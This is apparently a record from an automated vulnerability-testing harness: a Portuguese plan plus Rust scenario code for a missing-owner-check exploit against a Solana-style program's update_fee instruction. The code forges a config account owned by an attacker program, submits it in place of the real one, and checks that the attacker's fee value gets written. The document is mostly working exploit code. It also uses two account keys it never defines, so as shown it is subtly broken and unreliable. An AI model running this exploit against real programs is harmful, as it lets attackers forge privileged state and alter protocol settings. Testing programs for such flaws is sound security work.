attempts.raw:
{
  "plan": "O atacante cria uma conta forjada cujo owner é um programa malicioso (env.attacker_program), com os primeiros 8 bytes iguais ao ADMIN_CONFIG_DISCRIMINATOR e a pubkey do atacante nos bytes 8..40. O baseline usa a instrução update_fee com uma conta config legítima (owner = env.program_id) e a authority correta, provando que o cenário está montado. O ataque repete a mesma instrução, mas substitui a conta config pela conta forjada e usa o atacante como authority signer. O efeito mede que o new_fee foi gravado na conta forjada (offset 40..48), demonstrando que o programa aceitou uma conta com owner diferente do esperado.",
  "scenario": "let attacker = Pubkey::new_unique();
let admin = attacker;
let new_fee: u64 = 123456789;

// Conta config legítima (owner = programa)
let mut legit_data = vec![0u8; 48];
legit_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);
legit_data[8..40].copy_from_slice(admin.as_ref());
legit_data[40..48].copy_from_slice(&0u64.to_le_bytes());
let legit_config = account(&env.program_id, &legit_data, None);

// Conta config forjada (owner = programa do atacante)
let mut forged_data = vec![0u8; 48];
forged_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);
forged_data[8..40].copy_from_slice(admin.as_ref());
forged_data[40..48].copy_from_slice(&0u64.to_le_bytes());
let attacker_program = env.attacker_program.unwrap_or_else(Pubkey::new_unique);
let forged_config = account(&attacker_program, &forged_data, None);

// Instrução update_fee: byte 1 + new_fee (u64 LE)
let mut ix_data = vec![1u8];
ix_data.extend_from_slice(&new_fee.to_le_bytes());

// Baseline: uso legítimo com a conta config correta
let baseline_ix = env.raw_ix(&ix_data, &[
    AccountMeta::new(legit_config_key, false),
    AccountMeta::new_readonly(admin, true),
]);
let baseline_accounts = vec![
    (legit_config_key, legit_config.clone()),
    (admin, wallet(1_000_000_000)),
];
let baseline_result = env.baseline("update_fee legítimo", &baseline_ix, &baseline_accounts);

// Ataque: mesma instrução, mas com a conta forjada
let attack_ix = env.raw_ix(&ix_data, &[
    AccountMeta::new(forged_config_key, false),
    AccountMeta::new_readonly(admin, true),
]);
let attack_accounts = vec![
    (forged_config_key, forged_config),
    (admin, wallet(1_000_000_000)),
];
let attack_result = env.attack("update_fee com config forjada", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let forged_after = after(&attack_result, &forged_config_key);
    env.effect(
        "new_fee gravado na conta forjada com owner diferente do programa",
        read_u64(forged_after.data(), 40) == new_fee,
    );
    env.effect(
        "owner da conta forjada é o programa do atacante, não o programa-alvo",
        forged_after.owner() == &attacker_program,
    );
}"
}

